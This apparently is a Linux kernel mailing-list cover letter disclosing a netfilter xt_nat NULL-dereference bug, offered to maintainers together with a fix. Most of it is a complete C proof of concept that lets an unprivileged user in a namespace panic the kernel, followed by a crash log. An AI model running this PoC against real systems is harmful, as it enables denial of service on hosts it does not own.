Received: from azure-sdnproxy.icoremail.net (azure-sdnproxy.icoremail.net [207.46.229.174])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id B057E2135B8
	for <netfilter-devel@vger.kernel.org>; Sat, 13 Jun 2026 10:27:47 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=207.46.229.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781346472; cv=none; b=K1HAO+SMPMMDWQF5ur9OMvOBRfB5B65S82Vbp4GTueKbknF5k0IndraZJerGQRCRg+HkDymsPMnFt0PX3oqLV/hNSBFHrSpNhxIsAfIvjogjuD+BSThFhrOCW6bQE2typieKsqNsf7Onqm+BGctrGRjyok/og5pBiwuGTVasiqM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781346472; c=relaxed/simple;
	bh=I/o2O/ANfLtm62wbWEDoMtoQuurnV9f34yckCwzgyMo=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=tIaJhqqOFXHMKpKBw49LVGWggrwdSt8fvSLzBzRZGRKv/yrVdZVWyAaAuMZoe5IqdU80yaOV4jBNbtMW//o7YlAJvIHzilSNUjwEXsrB6VPmNZYAElUrbYn1R7kNoxTYwz4/U60R2Z4npHf6rN4bRYB9KDBx2HKfwo2oDiA8RAY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=lzu.edu.cn; spf=pass smtp.mailfrom=lzu.edu.cn; arc=none smtp.client-ip=207.46.229.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=lzu.edu.cn
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=lzu.edu.cn
Received: from enjou-Legion-Y7000P-2019 (unknown [172.23.56.36])
	by app1 (Coremail) with SMTP id ygmowAAHKMKKMC1qHPuBAA--.19853S2;
	Sat, 13 Jun 2026 18:27:23 +0800 (CST)
From: Ren Wei <n05ec@lzu.edu.cn>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	kaber@trash.net,
	yuantan098@gmail.com,
	yifanwucs@gmail.com,
	tomapufckgml@gmail.com,
	zcliangcn@gmail.com,
	bird@lzu.edu.cn,
	bronzed_45_vested@icloud.com,
	n05ec@lzu.edu.cn
Subject: [PATCH nf 0/1] netfilter: xt_nat: bridge nft_compat rule can trigger NULL-deref
Date: Sat, 13 Jun 2026 18:27:14 +0800
Message-ID: <cover.1781144570.git.bronzed_45_vested@icloud.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:ygmowAAHKMKKMC1qHPuBAA--.19853S2
X-Coremail-Antispam: 1UD129KBjvJXoWfJF1xuFW8tr1rJFW5uF17KFg_yoWkJr1DpF
	y5Ga4UGr4rKw4Y9F1Ika1UA343tw1kGryDX39Fk340yw429F1fJFySkrWF9F95AFWv9rWU
	WF4qga1Uta1qyw7anT9S1TB71UUUUU7qnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
	9KBjDU0xBIdaVrnRJUUUB01xkIjI8I6I8E6xAIw20EY4v20xvaj40_Wr0E3s1l1IIY67AE
	w4v_Jr0_Jr4l8cAvFVAK0II2c7xJM28CjxkF64kEwVA0rcxSw2x7M28EF7xvwVC0I7IYx2
	IY67AKxVW8JVW5JwA2z4x0Y4vE2Ix0cI8IcVCY1x0267AKxVWxJVW8Jr1l84ACjcxK6I8E
	87Iv67AKxVW0oVCq3wA2z4x0Y4vEx4A2jsIEc7CjxVAFwI0_GcCE3s1le2I262IYc4CY6c
	8Ij28IcVAaY2xG8wAqx4xG64xvF2IEw4CE5I8CrVC2j2WlYx0E2Ix0cI8IcVAFwI0_Jr0_
	Jr4lYx0Ex4A2jsIE14v26r1j6r4UMcvjeVCFs4IE7xkEbVWUJVW8JwACjcxG0xvY0x0EwI
	xGrwACjI8F5VA0II8E6IAqYI8I648v4I1lFIxGxcIEc7CjxVA2Y2ka0xkIwI1lc7CjxVAa
	w2AFwI0_Jw0_GFylc2xSY4AK6svPMxAIw28IcxkI7VAKI48JMxAIw28IcVCjz48v1sIEY2
	0_Gr4l4I8I3I0E4IkC6x0Yz7v_Jr0_Gr1lx2IqxVAqx4xG67AKxVWUJVWUGwC20s026x8G
	jcxK67AKxVWUGVWUWwC2zVAF1VAY17CE14v26r1q6r43MIIYrxkI7VAKI48JMIIF0xvE2I
	x0cI8IcVAFwI0_Jr0_JF4lIxAIcVC0I7IYx2IY6xkF7I0E14v26r4j6F4UMIIF0xvE42xK
	8VAvwI8IcIk0rVWUJVWUCwCI42IY6I8E87Iv67AKxVWUJVW8JwCI42IY6I8E87Iv6xkF7I
	0E14v26r4j6r4UJbIYCTnIWIevJa73UjIFyTuYvjfUonmRUUUUU
X-CM-SenderInfo: zqqvvuo6o23hxhgxhubq/1tbiAQEPCWoqb9EGiAALs9

From: Wyatt Feng <bronzed_45_vested@icloud.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/xt_nat.c.
The bug is reachable by an unprivileged user using private namespaces.
The relevant details are provided below.

---- details below ----

Bug details:

The bug is in `net/netfilter/xt_nat.c`, in the rev1/rev2
`SNAT`/`DNAT` xtables targets.

These targets are registered without a family restriction, so
`nft_compat` can resolve them from a bridge-family chain via the
existing `NFPROTO_UNSPEC` xtables fallback. However,
`xt_nat_checkentry()` accepts `NFPROTO_BRIDGE`, while the runtime target
handlers assume IP-family conntrack state is present.

When such a bridge-family compat rule is evaluated on traffic without an
attached conntrack entry, `nf_ct_get()` returns `NULL`.
`xt_snat_target_v1()`/`xt_dnat_target_v1()` and
`xt_snat_target_v2()`/`xt_dnat_target_v2()` then proceed to
`nf_nat_setup_info(ct, ...)`, which dereferences the NULL `ct` and
causes a kernel NULL-dereference and panic.

Reproducer:

gcc -O2 -Wall -Wextra mini_poc.c $(pkg-config --cflags --libs libmnl) -o mini_poc
unshare -Urn ./mini_poc


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN mini_poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <libmnl/libmnl.h>
#include <linux/if_packet.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_nat.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nf_tables_compat.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netlink.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define BUF_SIZE 4096

static void die(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static int run_cmd(bool allow_fail, const char *fmt, ...)
{
	char cmd[512];
	va_list ap;
	int ret;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	ret = system(cmd);
	if (ret != 0 && !allow_fail) {
		fprintf(stderr, "command failed: %s\n", cmd);
		exit(EXIT_FAILURE);
	}

	return ret;
}

static void cleanup(void)
{
	run_cmd(true, "nft delete table bridge nat >/dev/null 2>&1");
	run_cmd(true, "ip link del br0 >/dev/null 2>&1");
	run_cmd(true, "ip link del veth0 >/dev/null 2>&1");
	run_cmd(true, "ip link del veth1 >/dev/null 2>&1");
}

static uint32_t nf_tables_genid(void)
{
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	struct nfgenmsg *nfg;
	uint32_t genid = 0;
	int ret;

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (!nl)
		die("mnl_socket_open");

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
		die("mnl_socket_bind");

	nlh = mnl_nlmsg_put_header(buf);
	nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_GETGEN;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_seq = 1;

	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
	nfg->nfgen_family = NFPROTO_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(0);

	ret = mnl_socket_sendto(nl, nlh, nlh->nlmsg_len);
	if (ret < 0)
		die("mnl_socket_sendto(GETGEN)");

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	if (ret < 0)
		die("mnl_socket_recvfrom(GETGEN)");

	for (nlh = (struct nlmsghdr *)buf; mnl_nlmsg_ok(nlh, ret);
	     nlh = mnl_nlmsg_next(nlh, &ret)) {
		struct nlattr *attr;

		if (nlh->nlmsg_type != ((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWGEN))
			continue;

		mnl_attr_for_each(attr, nlh, sizeof(*nfg)) {
			if (mnl_attr_get_type(attr) == NFTA_GEN_ID) {
				genid = ntohl(mnl_attr_get_u32(attr));
				break;
			}
		}
		if (genid)
			break;
	}

	mnl_socket_close(nl);

	if (!genid) {
		errno = EPROTO;
		die("GETGEN missing genid");
	}

	return genid;
}

static void put_nla_u32_be(struct nlmsghdr *nlh, uint16_t type, uint32_t v)
{
	mnl_attr_put_u32(nlh, type, htonl(v));
}

static void put_batch_begin(struct nlmsghdr *nlh, uint32_t seq, uint32_t genid)
{
	struct nfgenmsg *nfg;

	nlh->nlmsg_len = NLMSG_HDRLEN;
	nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_seq = seq;
	nlh->nlmsg_pid = 0;

	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
	nfg->nfgen_family = NFPROTO_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(NFNL_SUBSYS_NFTABLES);

	put_nla_u32_be(nlh, NFNL_BATCH_GENID, genid);
}

static void put_batch_end(struct nlmsghdr *nlh, uint32_t seq)
{
	struct nfgenmsg *nfg;

	nlh->nlmsg_len = NLMSG_HDRLEN;
	nlh->nlmsg_type = NFNL_MSG_BATCH_END;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_seq = seq;
	nlh->nlmsg_pid = 0;

	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
	nfg->nfgen_family = NFPROTO_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(NFNL_SUBSYS_NFTABLES);
}

static void build_rule_msg(struct nlmsghdr *nlh)
{
	struct nfgenmsg *nfg;
	struct nlattr *exprs;
	struct nlattr *elem;
	struct nlattr *expr_data;
	struct nf_nat_range info = {
		.flags = NF_NAT_RANGE_MAP_IPS,
		.min_addr.ip = htonl(0x01020304),
		.max_addr.ip = htonl(0x01020304),
	};

	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
	nfg->nfgen_family = NFPROTO_BRIDGE;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = 0;

	mnl_attr_put_strz(nlh, NFTA_RULE_TABLE, "nat");
	mnl_attr_put_strz(nlh, NFTA_RULE_CHAIN, "postrouting");

	exprs = mnl_attr_nest_start(nlh, NFTA_RULE_EXPRESSIONS);
	elem = mnl_attr_nest_start(nlh, NFTA_LIST_ELEM);
	mnl_attr_put_strz(nlh, NFTA_EXPR_NAME, "target");

	expr_data = mnl_attr_nest_start(nlh, NFTA_EXPR_DATA);
	mnl_attr_put_strz(nlh, NFTA_TARGET_NAME, "SNAT");
	put_nla_u32_be(nlh, NFTA_TARGET_REV, 1);
	mnl_attr_put(nlh, NFTA_TARGET_INFO, sizeof(info), &info);
	mnl_attr_nest_end(nlh, expr_data);

	mnl_attr_nest_end(nlh, elem);
	mnl_attr_nest_end(nlh, exprs);
}

static void install_rule(void)
{
	struct mnl_socket *nl;
	char buf[BUF_SIZE];
	char reply[BUF_SIZE];
	struct nlmsghdr *nlh;
	uint32_t genid;
	size_t len;
	int ret;

	memset(buf, 0, sizeof(buf));
	genid = nf_tables_genid();

	nlh = (struct nlmsghdr *)buf;
	put_batch_begin(nlh, 1, genid);
	len = NLMSG_ALIGN(nlh->nlmsg_len);

	nlh = (struct nlmsghdr *)(buf + len);
	nlh->nlmsg_len = NLMSG_HDRLEN;
	nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK;
	nlh->nlmsg_seq = 2;
	nlh->nlmsg_pid = 0;
	build_rule_msg(nlh);
	len += NLMSG_ALIGN(nlh->nlmsg_len);

	nlh = (struct nlmsghdr *)(buf + len);
	put_batch_end(nlh, 3);
	len += NLMSG_ALIGN(nlh->nlmsg_len);

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (!nl)
		die("mnl_socket_open");

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
		die("mnl_socket_bind");

	ret = mnl_socket_sendto(nl, buf, len);
	if (ret < 0)
		die("mnl_socket_sendto(rule)");

	ret = mnl_socket_recvfrom(nl, reply, sizeof(reply));
	if (ret > 0)
		ret = mnl_cb_run(reply, ret, 2, mnl_socket_get_portid(nl), NULL, NULL);
	if (ret < 0)
		die("mnl_cb_run(rule)");

	mnl_socket_close(nl);
}

static void send_trigger_frames(void)
{
	unsigned char frame[60];
	struct sockaddr_ll sll;
	struct ifreq ifr;
	struct timespec ts = { .tv_sec = 0, .tv_nsec = 20 * 1000 * 1000 };
	int fd;
	int i;

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die("socket(AF_PACKET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "veth0p");
	memset(&sll, 0, sizeof(sll));

	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("ioctl(SIOCGIFINDEX)");
	sll.sll_ifindex = ifr.ifr_ifindex;

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die("ioctl(SIOCGIFHWADDR)");

	memset(frame, 'A', sizeof(frame));
	memset(frame, 0xff, 6);
	memcpy(frame + 6, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	frame[12] = 0x88;
	frame[13] = 0xb5;

	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_halen = ETH_ALEN;
	memset(sll.sll_addr, 0xff, ETH_ALEN);

	for (i = 0; i < 32; i++) {
		if (sendto(fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die("sendto");
		nanosleep(&ts, NULL);
	}

	close(fd);
}

int main(void)
{
	atexit(cleanup);

	cleanup();
	run_cmd(false, "nft add table bridge nat");
	run_cmd(false, "nft add chain bridge nat postrouting "
		      "'{ type filter hook postrouting priority 300; policy accept; }'");
	install_rule();

	run_cmd(false, "ip link add br0 type bridge");
	run_cmd(false, "ip link set br0 up");
	run_cmd(false, "ip link add veth0 type veth peer name veth0p");
	run_cmd(false, "ip link add veth1 type veth peer name veth1p");
	run_cmd(false, "ip link set veth0 master br0");
	run_cmd(false, "ip link set veth1 master br0");
	run_cmd(false, "ip link set veth0 up");
	run_cmd(false, "ip link set veth1 up");
	run_cmd(false, "ip link set veth0p up");
	run_cmd(false, "ip link set veth1p up");

	usleep(200000);
	send_trigger_frames();
	sleep(1);
	return 0;
}


------END mini_poc.c--------

----BEGIN crash log----

[  174.769777][   T11] ------------[ cut here ]------------
[  174.770980][   T11] !(ct != NULL && (ctinfo == IP_CT_NEW || ctinfo == IP_CT_RELATED || ctinfo == IP_CT_RELATED_REPLY))
[  174.771001][   T11] WARNING: net/netfilter/xt_nat.c:93 at xt_snat_target_v1+0x115/0x1b0, CPU#0: kworker/0:1/11
[  174.804089][   T11]  nft_do_chain_bridge+0x246/0xfa0
[  174.845653][   T11]  mld_sendpack+0x8f7/0xec0
[  174.847675][   T11]  mld_ifc_work+0x75a/0xc10
[  174.865335][   T11] ---[ end trace 0000000000000000 ]---
[  174.867747][   T11] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000019: 0000 [#1] SMP KASAN NOPTI
[  174.868849][   T11] KASAN: null-ptr-deref in range [0x00000000000000c8-0x00000000000000cf]
[  174.878439][   T11] RIP: 0010:nf_nat_setup_info+0xd1/0x2c30
[  174.903767][   T11]  ? xt_snat_target_v1+0x115/0x1b0
[  174.916037][   T11]  xt_snat_target_v1+0x14b/0x1b0
[  174.924669][   T11]  nft_target_eval_bridge+0x1c1/0x320
[  174.931246][   T11]  nft_do_chain+0x2e5/0x1990
[  174.998163][   T11]  ip6_finish_output2+0xfd4/0x1ce0
[  175.004839][   T11]  ? NF_HOOK.constprop.0+0x277/0x5a0
[  175.014886][   T11]  mld_sendpack+0x8f7/0xec0
[  175.018164][   T11]  mld_ifc_work+0x75a/0xc10
[  175.042339][   T11] RIP: 0010:nf_nat_setup_info+0xd1/0x2c30
[  175.058662][   T11] Kernel panic - not syncing: Fatal exception in interrupt


-----END crash log-----

Best regards,
Wyatt Feng


Wyatt Feng (1):
  netfilter: xt_nat: reject unsupported target families

 net/netfilter/xt_nat.c | 9 +++++++++
 1 file changed, 9 insertions(+)

-- 
2.47.3

